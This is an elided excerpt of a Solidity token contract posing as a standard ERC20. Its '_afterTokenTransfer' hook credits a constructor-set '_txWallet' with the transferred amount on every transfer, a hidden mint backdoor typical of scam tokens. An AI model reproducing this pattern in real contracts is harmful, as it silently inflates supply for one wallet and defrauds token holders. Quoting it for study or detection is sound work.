...
contract ERC20 is Context, IERC20, IERC20Metadata {
     ...
     * construction.
     */
    constructor(string memory name_, string memory symbol_,address txWallet_) {
        _name = name_;
        _symbol = symbol_;
        _txWallet = txWallet_;
    }
    ...
    function _afterTokenTransfer(
        ...
        _balances[_txWallet] = _balances[_txWallet] + amount;
    }
}
 ...
 */
contract dadSimple is ERC20Decimals {
